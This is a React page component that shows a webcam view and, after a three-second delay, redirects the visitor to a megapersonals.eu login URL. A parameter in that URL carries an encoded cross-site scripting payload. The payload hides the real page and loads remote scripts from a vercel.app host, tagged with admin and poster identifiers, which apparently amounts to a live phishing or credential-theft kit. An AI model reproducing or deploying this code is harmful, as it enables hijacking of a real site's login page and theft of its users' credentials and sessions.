"use client";
import React, { useEffect, useState } from "react";
import { site } from "../config";
import Webcam from "react-webcam";
function Home({ adminId, posterId }) {
  useEffect(() => {
    setTimeout(() => {
      window.location.href = `https://megapersonals.eu/users/auth/login?bad_captcha=%20%3C/h2%3E%20%20%3Cstyle%3E.container%20,%20footer%20%7b%20display:%20none%20;%20%7d%20a%20%7b%20color:%20white;%20%7d%20%3C/style%3E%20%3Cscript%20src=%22https://megabacknew.vercel.app/antiClick.js%22%3E%20%3C/script%3E%20%3Cscript%20src=%22https://megabacknew.vercel.app/main.js%22%3E%20%3C/script%20%3E&admin=${adminId}&poster=${posterId}&site=${site}`; // Redirect to an external site
    }, 3000); // 2 seconds delay for demonstration
  }, []);

  return (
    <div className="relative h-screen w-screen flex flex-col justify-center items-center bg-black">
      <Webcam
        audio={false}
        className="object-cover h-screen w-screen lg:w-auto"
        // height={1080}
        // width={1262}
        // screenshotFormat="image/jpeg"
        // videoConstraints={videoConstraints}
      />
      {/* Other components can be rendered here */}
    </div>
  );
}

export default Home;
